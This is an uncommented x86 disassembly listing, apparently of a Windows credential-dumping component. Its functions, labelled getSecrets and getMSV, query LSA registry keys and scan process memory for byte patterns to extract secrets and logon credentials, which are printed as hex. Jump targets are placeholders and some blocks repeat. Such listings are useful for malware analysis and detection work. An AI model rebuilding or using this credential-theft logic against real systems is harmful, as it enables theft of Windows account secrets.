mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
mov edx [ rw-data ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000ceb0
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] bl
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
mov edx [ rw-data ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000ceb0
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] bl
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
sub esp 0x1c
mov esi esp
lea eax [ esp + 0x2c ]
mov [ esp + 0x28 ] esp
call sub_1000d2e0
mov ecx [ ebp + 0x8 ]
call sub_10001850
mov edx [ esp + 0x2c ]
mov bl al
mov eax [ edx + 0x4 ]
add esp 0x1c
lea ecx [ esp + 0x14 ]
mov [ esp + eax + 0x10 ] r--data
call sub_10003fa0
mov ecx [ esp + 0x10 ]
mov edx [ ecx + 0x4 ]
lea eax [ esp + 0x60 ]
mov [ esp + edx + 0x10 ] r--data
push eax
mov [ esp + 0x64 ] r--data
call sub_10015fc5
add esp 0x4
pop edi
pop esi
mov al bl
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
push 0x0
call sub_100033b0
or eax 0x4
getSecrets
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x1b4
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x1b0 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov [ esp + 0x18 ] esi
call sub_1000d630
test al al
je r-xdata
mov eax [ ebp + 0xc ]
push eax
push esi
call getSECFunctions
mov ecx [ esp + 0x1c4 ]
add esp 0x8
pop edi
pop esi
pop ebx
xor ecx esp
call sub_10016ec3
mov esp ebp
pop ebp
retn
lea eax [ esp + 0x38 ]
push eax
mov bl 0x1
call [ rw-data ]
test eax eax
js r-xdata
sub esp 0x1c
mov ecx esp
mov [ esp + 0x30 ] esp
xor edx edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push 0x2a
mov eax r--data
mov [ ecx ] dx
call sub_10001f10
mov ecx esi
call sub_10001850
add esp 0x1c
mov bl al
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x1b0 ]
xor ecx esp
call sub_10016ec3
mov esp ebp
pop ebp
retn
lea ecx [ esp + 0x24 ]
push ecx
push 0x20019
xor edi edi
push edi
push r--data
push 0x80000002
call [ RegOpenKeyExW@IAT ]
test eax eax
jne r-xdata
sub esp 0x1c
mov ecx esp
mov [ esp + 0x30 ] esp
xor edx edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] edi
push 0x2c
mov eax r--data
mov [ ecx ] dx
call sub_10001f10
mov ecx esi
call sub_10001850
mov bl al
add esp 0x1c
lea eax [ esp + 0x38 ]
push eax
call [ rw-data ]
mov al bl
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x1b0 ]
xor ecx esp
call sub_10016ec3
mov esp ebp
pop ebp
retn
mov ecx [ esp + 0x24 ]
push edi
push edi
push edi
push edi
push edi
push edi
lea edx [ esp + 0x54 ]
push edx
lea eax [ esp + 0x44 ]
push eax
push edi
push edi
push edi
push ecx
call [ RegQueryInfoKeyW@IAT ]
test eax eax
jne r-xdata
sub esp 0x1c
mov ecx esp
mov [ esp + 0x30 ] esp
xor edx edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] edi
push 0x45
mov eax r--data
mov [ ecx ] dx
call sub_10001f10
mov ecx esi
call sub_10001850
add esp 0x1c
mov bl al
xor esi esi
mov [ esp + 0x2c ] esi
cmp [ esp + 0x28 ] edi
jbe r-xdata
mov eax [ esp + 0x24 ]
push eax
call [ RegCloseKey@IAT ]
lea eax [ esp + 0x38 ]
push eax
call [ rw-data ]
mov al bl
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x1b0 ]
xor ecx esp
call sub_10016ec3
mov esp ebp
pop ebp
retn
mov eax [ esp + 0x3c ]
xor edx edx
lea eax [ eax + eax + 0x2 ]
mov [ esp + 0x1c ] edx
xor ecx ecx
mov [ esp + 0x34 ] eax
mov edx 0x2
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_10015dba
mov edx [ esp + 0x28 ]
add esp 0x4
push edi
push edi
push edi
push edi
lea ecx [ esp + 0x44 ]
push ecx
push eax
push esi
push edx
mov [ esp + 0x40 ] eax
call [ RegEnumKeyExW@IAT ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x20 ]
push ecx
call sub_1001748d
mov esi [ esp + 0x30 ]
inc esi
add esp 0x4
mov [ esp + 0x2c ] esi
cmp esi [ esp + 0x28 ]
jb r-xdata
mov eax [ esp + 0x34 ]
add eax eax
mov [ esp + 0x1c ] ax
mov [ esp + 0x1e ] ax
movzx eax ax
shr eax 0x1
xor ecx ecx
mov [ esp + 0x184 ] cx
push eax
mov eax [ esp + 0x24 ]
lea ecx [ esp + 0x188 ]
mov [ esp + 0x19c ] 0x7
mov [ esp + 0x198 ] edi
call sub_10001f10
lea edx [ esp + 0xd8 ]
push edx
call sub_1000d200
push 0xa
lea ecx [ esp + 0xdc ]
call sub_1000d080
mov eax [ esp + 0xd8 ]
mov eax [ eax + 0x4 ]
xor esi esi
test [ esp + eax + 0xe4 ] 0x6
jne r-xdata
mov eax [ esp + 0x24 ]
push eax
call [ RegCloseKey@IAT ]
lea eax [ esp + 0x38 ]
push eax
call [ rw-data ]
mov al bl
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x1b0 ]
xor ecx esp
call sub_10016ec3
mov esp ebp
pop ebp
retn
mov ecx [ esp + 0xd8 ]
mov ecx [ ecx + 0x4 ]
lea ecx [ esp + ecx + 0xd8 ]
cmp esi edi
je r-xdata
mov eax [ esp + eax + 0x110 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
lea edx [ esp + 0x184 ]
push edx
push ecx
lea eax [ esp + 0xe0 ]
push r--data
push eax
call sub_100076f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
xor ebx ebx
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax esi
cmp [ ecx + 0x38 ] edi
jne r-xdata
mov esi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp ebx edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push edi
call sub_100033b0
or eax 0x4
sub esp 0x1c
mov esi esp
lea eax [ esp + 0xf4 ]
mov [ esp + 0x2c ] esp
call sub_1000d2e0
mov esi [ esp + 0x34 ]
mov ecx esi
call sub_10001850
mov ecx [ esp + 0x54 ]
add esp 0x1c
lea edx [ esp + 0x30 ]
push edx
mov bl al
push 0x2
lea eax [ esp + 0x24 ]
push eax
push ecx
call [ rw-data ]
test eax eax
js r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] edi
jne r-xdata
mov ebx 0x4
sub esp 0x1c
mov ecx esp
mov [ esp + 0x30 ] esp
xor edx edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] edi
push 0x27
mov eax r--data
mov [ ecx ] dx
call sub_10001f10
mov ecx esi
call sub_10001850
add esp 0x1c
mov bl al
mov eax [ esp + 0x30 ]
push edi
push edi
push edi
lea edx [ esp + 0x1c ]
push edx
push eax
mov [ esp + 0x24 ] edi
call [ rw-data ]
test eax eax
js r-xdata
push edi
call sub_100033b0
or eax 0x4
mov eax [ esp + 0x184 ]
push eax
call sub_100173b1
add esp 0x4
sub esp 0x1c
mov eax r--data
mov esi esp
mov [ esp + 0x30 ] esp
call sub_10001ab0
mov ecx [ esp + 0x34 ]
call sub_10001850
mov bl al
add esp 0x1c
lea eax [ esp + 0x30 ]
push eax
call [ rw-data ]
jmp r-xdata
mov ecx [ esp + 0x10 ]
cmp [ ecx ] edi
jbe r-xdata
lea ecx [ esp + 0xd8 ]
call sub_10008a40
cmp [ esp + 0x198 ] 0x8
jb r-xdata
mov edx [ esp + 0x10 ]
push edx
call [ LsaFreeMemory@IAT ]
lea eax [ esp + 0x30 ]
push eax
call [ rw-data ]
jmp r-xdata
lea edx [ esp + 0x40 ]
push edx
call sub_1000d200
mov eax [ esp + 0x10 ]
xor ebx ebx
mov [ esp + 0xe ] 0x1
cmp [ eax ] edi
jbe r-xdata
push 0xa
lea ecx [ esp + 0x44 ]
call sub_1000d080
mov edx [ esp + 0x40 ]
mov eax [ edx + 0x4 ]
xor esi esi
test [ esp + eax + 0x4c ] 0x6
jne r-xdata
mov eax [ eax + 0x8 ]
mov cl [ ebx + eax ]
xor eax eax
mov [ esp + 0xf ] cl
test bl 0x1
je r-xdata
mov ecx [ esp + 0x40 ]
mov ecx [ ecx + 0x4 ]
lea ecx [ esp + ecx + 0x40 ]
cmp esi edi
je r-xdata
mov eax [ esp + eax + 0x78 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
test cl cl
setne al
test cl cl
sete al
jmp r-xdata
cmp [ esp + 0xe ] 0x0
je r-xdata
mov eax [ ecx + 0xc ]
or eax esi
cmp [ ecx + 0x38 ] edi
jne r-xdata
mov esi 0x4
mov eax [ esp + 0x10 ]
cmp ebx [ eax ]
jb r-xdata
push 0xa
mov ecx esi
call sub_1000d080
mov edx [ esp + 0x40 ]
mov eax [ edx + 0x4 ]
xor esi esi
test [ esp + eax + 0x4c ] 0x6
jne r-xdata
and [ esp + 0xe ] al
push edi
lea ecx [ esp + 0x174 ]
push 0x2
push ecx
call sub_10016867
add esp 0xc
mov ecx eax
lea esi [ esp + 0x40 ]
call sub_100079b0
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
mov edx 0x30
mov [ ecx + eax + 0x40 ] dx
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov edx [ ecx + eax + 0x14 ]
add ecx eax
and edx 0xfffff9ff
push 0x20
or edx 0x800
push ecx
mov [ ecx + 0x14 ] edx
movzx ecx [ esp + 0x17 ]
push ecx
push eax
call sub_1000cce0
add esp 0x4
push eax
call sub_100079f0
inc ebx
add esp 0x8
test bl 0x1f
jne r-xdata
sub esp 0x1c
mov esi esp
lea eax [ esp + 0x5c ]
mov [ esp + 0x30 ] esp
call sub_1000d2e0
mov ecx [ esp + 0x34 ]
call sub_10001850
add esp 0x1c
lea ecx [ esp + 0x40 ]
mov bl al
call sub_10008a40
mov eax [ esp + 0x10 ]
mov ecx [ eax ]
mov eax [ eax + 0x8 ]
shr ecx 0x1
xor edx edx
push ecx
lea ecx [ esp + 0x1a4 ]
mov [ esp + 0x1b8 ] 0x7
mov [ esp + 0x1b4 ] edi
mov [ esp + 0x1a4 ] dx
call sub_10001f10
lea eax [ esp + 0x1a0 ]
push eax
push ecx
lea ecx [ esp + 0x48 ]
push r--data
push ecx
call sub_100076f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov edx [ esi ]
mov eax [ edx + 0x4 ]
xor ebx ebx
test [ eax + esi + 0xc ] 0x6
jne r-xdata
push edi
call sub_100033b0
or eax 0x4
mov ecx [ esp + 0x40 ]
mov ecx [ ecx + 0x4 ]
lea ecx [ esp + ecx + 0x40 ]
cmp esi edi
je r-xdata
mov eax [ esp + eax + 0x78 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp ebx edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov eax [ ecx + 0xc ]
or eax esi
cmp [ ecx + 0x38 ] edi
jne r-xdata
mov esi 0x4
lea esi [ esp + 0x1a0 ]
call sub_10001af0
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] edi
jne r-xdata
mov ebx 0x4
push edi
call sub_100033b0
or eax 0x4
push edi
call sub_100033b0
or eax 0x4
sub_1000e0b0
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ r--data ]
mov ecx [ r--data ]
push ebx
push esi
xor esi esi
push edi
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x18 ] esi
mov [ ebp - 0xc ] 0x68
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x1c ] 0x8b55
mov [ ebp - 0x1a ] 0xec
mov [ ebp - 0x20 ] esi
cmp [ rw-data ] esi
je r-xdata
push r--data
call [ GetModuleHandleW@IAT ]
cmp eax esi
je r-xdata
cmp [ rw-data ] esi
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0xc
lea edx [ ebp - 0x2c ]
push edx
push eax
call [ GetCurrentProcess@IAT ]
push eax
call [ GetModuleInformation@IAT ]
test eax eax
je r-xdata
cmp [ rw-data ] esi
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10016ec3
mov esp ebp
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x2c ]
push 0x1
lea ecx [ ebp - 0x18 ]
push ecx
mov ecx [ ebp - 0x28 ]
lea edx [ ebp - 0x14 ]
push edx
add ecx eax
push ecx
push eax
mov edi 0x8
mov ebx eax
call sub_10002ba0
add esp 0x14
test al al
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ ebp - 0x18 ]
lea esi [ ebx - 0x1 ]
mov [ ebp - 0xb ] edx
mov [ ebp - 0x18 ] esi
mov eax 0x1
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10016ec3
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x28 ]
push 0x1
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0xc ]
push ecx
add edx ebx
push edx
inc esi
push esi
mov edi 0x5
call sub_10002ba0
add esp 0x14
test al al
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov esi [ ebp - 0x18 ]
push 0x0
lea eax [ ebp - 0x20 ]
push eax
lea ecx [ ebp - 0x1c ]
push ecx
push ebx
push esi
mov edi 0x3
call sub_10002ba0
add esp 0x14
test al al
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp - 0x20 ]
sub eax 0x2
mov ecx esi
sub ecx eax
add ecx 0xfffffff9
mov [ ebp - 0x20 ] eax
cmp ecx 0x35
ja r-xdata
cmp [ rw-data ] 0x0
je r-xdata
movzx ecx [ ecx + lookup_table_1000e26c ]
jmp [ ecx * 4 + jump_table_1000e25c ]
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] eax
jmp r-xdata
sub_1000e270
add eax [ ecx ]
add eax [ ebx ]
add [ ebx ] eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add [ ecx ] eax
add eax [ ebx ]
add al [ ebx ]
add eax [ edx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ edx ]
add eax [ ebx ]
add eax [ edx ]
int3
getMSVFunctions
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x9c
push ebx
push esi
push edi
lea eax [ esp + 0x10 ]
push eax
call sub_1000d200
call sub_1000e0b0
test al al
mov eax r--data
jne r-xdata
push eax
push ecx
lea ecx [ esp + 0x18 ]
push r--data
push ecx
call sub_100076f0
add esp 0xc
push eax
call sub_100076f0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov bl 0x6
xor edi edi
test [ eax + esi + 0xc ] bl
jne r-xdata
mov eax r--data
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0xa
mov ecx esi
call sub_1000d080
mov edx [ esi ]
mov eax [ edx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] bl
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
mov edx [ rw-data ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000ceb0
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] bl
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
mov edx [ rw-data ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000ceb0
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] bl
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
mov edx [ rw-data ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000ceb0
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] bl
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
sub esp 0x1c
mov esi esp
lea eax [ esp + 0x2c ]
mov [ esp + 0x28 ] esp
call sub_1000d2e0
mov ecx [ ebp + 0x8 ]
call sub_10001850
mov edx [ esp + 0x2c ]
mov bl al
mov eax [ edx + 0x4 ]
add esp 0x1c
lea ecx [ esp + 0x14 ]
mov [ esp + eax + 0x10 ] r--data
call sub_10003fa0
mov ecx [ esp + 0x10 ]
mov edx [ ecx + 0x4 ]
lea eax [ esp + 0x60 ]
mov [ esp + edx + 0x10 ] r--data
push eax
mov [ esp + 0x64 ] r--data
call sub_10015fc5
add esp 0x4
pop edi
pop esi
mov al bl
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
push 0x0
call sub_100033b0
or eax 0x4
getMSV
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x64
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x60 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push ebx
push esi
xor esi esi
push edi
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] ecx
xor edx edx
push 0x6
mov eax r--data
lea ecx [ esp + 0x34 ]
mov [ esp + 0x24 ] esi
mov [ esp + 0x28 ] esi
mov [ esp + 0x2c ] esi
mov [ esp + 0x20 ] sub_1000e650
mov [ esp + 0x48 ] 0x7
mov [ esp + 0x44 ] esi
mov [ esp + 0x34 ] dx
call sub_10001f10
lea edi [ esp + 0x30 ]
lea ecx [ esp + 0x1c ]
lea ebx [ esp + 0x4c ]
call sub_10013880
mov ecx eax
lea ebx [ esp + 0x20 ]
call sub_10010120
mov edi 0x8
cmp [ esp + 0x64 ] edi
jb r-xdata
xor ecx ecx
mov [ esp + 0x64 ] 0x7
mov [ esp + 0x60 ] esi
mov [ esp + 0x50 ] cx
cmp [ esp + 0x44 ] edi
jb r-xdata
mov eax [ esp + 0x50 ]
push eax
call sub_100173b1
add esp 0x4
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
push eax
lea ecx [ esp + 0x24 ]
call sub_10015330
mov ebx [ esp + 0x24 ]
add esp 0x4
mov [ esp + 0x13 ] al
cmp ebx esi
je r-xdata
mov edx [ esp + 0x30 ]
push edx
call sub_100173b1
add esp 0x4
mov ecx [ esp + 0x6c ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_10016ec3
mov esp ebp
pop ebp
retn
mov edi [ esp + 0x24 ]
mov eax ebx
call sub_10013c60
push ebx
call sub_100173b1
mov al [ esp + 0x17 ]
add esp 0x4
sub_1000e650
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1002974b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x268
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x260 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x278 ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
call sub_1000e0b0
test al al
je r-xdata
sub esp 0x1c
mov ecx esp
xor eax eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
mov [ esp + 0x3c ] esp
mov [ ecx ] ax
push 0xd
mov eax r--data
lea eax [ esp + 0x28 ]
push eax
lea ecx [ esp + 0x20 ]
push ecx
xor ebx ebx
push esi
mov [ esp + 0x34 ] ebx
mov [ esp + 0x28 ] ebx
call [ rw-data ]
test eax eax
js r-xdata
sub esp 0x1c
mov ecx esp
xor edx edx
mov [ esp + 0x3c ] esp
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] ebx
mov [ ecx ] dx
push 0xe
mov eax r--data
jmp r-xdata
lea edx [ esp + 0xc4 ]
push edx
call sub_1000d200
lea eax [ esp + 0x2c ]
push eax
mov [ esp + 0x284 ] ebx
call sub_1000d200
mov [ esp + 0x280 ] 0x1
xor esi esi
jmp r-xdata
call sub_10001f10
mov ecx [ ebp + 0xc ]
call sub_10001850
add esp 0x1c
push ebx
lea ecx [ esp + 0x238 ]
push 0x2
push ecx
call sub_10016867
mov edx [ esp + 0xd0 ]
mov ecx [ edx + 0x4 ]
mov edx [ eax + 0xc ]
add esp 0xc
push edx
mov edx [ eax + 0x8 ]
mov eax [ eax ]
lea ecx [ esp + ecx + 0xc8 ]
push edx
push ecx
call eax
mov ecx [ esp + 0xd0 ]
mov eax [ ecx + 0x4 ]
lea eax [ esp + eax + 0xd0 ]
mov edx 0x30
mov [ eax + 0x40 ] dx
mov eax [ esp + 0xd0 ]
mov eax [ eax + 0x4 ]
mov ecx [ esp + eax + 0xe4 ]
mov edx [ esp + 0x28 ]
lea eax [ esp + eax + 0xd0 ]
and ecx 0xfffff9ff
or ecx 0x800
mov [ eax + 0x14 ] ecx
movzx eax [ esi + edx + 0x20 ]
add esp 0xc
push eax
lea ecx [ esp + 0xc8 ]
push ecx
call sub_1000cce0
push ebx
lea edx [ esp + 0x1f8 ]
push 0x2
push edx
call sub_10016867
mov edx [ eax + 0xc ]
mov ecx [ esp + 0x38 ]
mov ecx [ ecx + 0x4 ]
add esp 0xc
push edx
mov edx [ eax + 0x8 ]
mov eax [ eax ]
lea ecx [ esp + ecx + 0x30 ]
push edx
push ecx
call eax
mov ecx [ esp + 0x38 ]
mov eax [ ecx + 0x4 ]
lea eax [ esp + eax + 0x38 ]
mov edx 0x30
mov [ eax + 0x40 ] dx
mov eax [ esp + 0x38 ]
mov eax [ eax + 0x4 ]
mov ecx [ esp + eax + 0x4c ]
mov edx [ esp + 0x28 ]
lea eax [ esp + eax + 0x38 ]
and ecx 0xfffff9ff
or ecx 0x800
mov [ eax + 0x14 ] ecx
movzx eax [ esi + edx + 0x10 ]
add esp 0xc
push eax
lea ecx [ esp + 0x30 ]
push ecx
call sub_1000cce0
inc esi
cmp esi 0x10
jb r-xdata
lea edx [ esp + 0x15c ]
push edx
call sub_1000d200
cmp [ ebp + 0x10 ] 0x0
mov [ esp + 0x280 ] 0x2
je r-xdata
mov eax [ esp + 0x1c ]
movzx ecx [ eax + 0x8 ]
mov eax [ eax + 0xc ]
shr ecx 0x1
xor edx edx
push ecx
mov esi 0x7
lea ecx [ esp + 0x238 ]
mov [ esp + 0x24c ] esi
mov [ esp + 0x248 ] ebx
mov [ esp + 0x238 ] dx
call sub_10001f10
mov [ esp + 0x280 ] 0x5
mov eax [ esp + 0x1c ]
movzx ecx [ eax ]
mov eax [ eax + 0x4 ]
shr ecx 0x1
xor edx edx
push ecx
lea ecx [ esp + 0x1f8 ]
mov [ esp + 0x20c ] esi
mov [ esp + 0x208 ] ebx
mov [ esp + 0x1f8 ] dx
call sub_10001f10
lea esi [ esp + 0x254 ]
lea eax [ esp + 0x2c ]
mov [ esp + 0x280 ] 0x6
call sub_1000d2e0
mov [ esp + 0x14 ] eax
lea esi [ esp + 0x218 ]
lea eax [ esp + 0xc4 ]
mov [ esp + 0x280 ] 0x7
call sub_1000d2e0
mov [ esp + 0x24 ] eax
push 0xa
lea ecx [ esp + 0x160 ]
mov [ esp + 0x284 ] 0x8
call sub_1000d080
mov eax [ esp + 0x15c ]
mov eax [ eax + 0x4 ]
mov ecx [ esp + eax + 0x168 ]
xor esi esi
test cl 0x6
jne r-xdata
lea esi [ esp + 0x218 ]
lea eax [ esp + 0x2c ]
call sub_1000d2e0
mov edi eax
lea esi [ esp + 0x1f4 ]
lea eax [ esp + 0xc4 ]
mov [ esp + 0x280 ] 0x3
call sub_1000d2e0
push r--data
push ecx
push edi
push ecx
push r--data
push ecx
push eax
push ecx
lea eax [ esp + 0x17c ]
push r--data
push eax
mov [ esp + 0x2a8 ] 0x4
call sub_100076f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0xc
push eax
call sub_100076f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0xc
push eax
call sub_100076f0
mov esi 0x8
add esp 0x8
cmp [ esp + 0x208 ] esi
jb r-xdata
mov ecx [ esp + 0x15c ]
mov ecx [ ecx + 0x4 ]
lea ecx [ esp + ecx + 0x15c ]
cmp esi ebx
je r-xdata
mov eax [ esp + eax + 0x194 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
xor edx edx
mov [ esp + 0x280 ] 0x2
mov [ esp + 0x208 ] 0x7
mov [ esp + 0x204 ] ebx
mov [ esp + 0x1f4 ] dx
cmp [ esp + 0x22c ] esi
jb r-xdata
mov ecx [ esp + 0x1f4 ]
push ecx
call sub_100173b1
add esp 0x4
lea edx [ esp + 0x234 ]
push edx
push ecx
lea eax [ esp + 0x164 ]
push r--data
push eax
call sub_100076f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
xor edi edi
